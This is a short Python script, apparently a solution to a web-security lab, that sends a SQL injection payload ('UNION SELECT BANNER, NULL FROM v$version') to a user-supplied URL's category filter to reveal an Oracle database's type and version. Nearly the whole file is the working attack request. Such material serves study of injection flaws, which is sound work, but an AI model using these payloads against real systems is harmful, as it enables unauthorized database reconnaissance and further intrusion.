#SQL injection attack, querying the database type and version on Oracle
import requests
url = input("enter url : ")
path="filter?category=Gifts"
payload="'+UNION+SELECT+BANNER,+NULL+FROM+v$version--"
r=requests.get(url+path+payload)
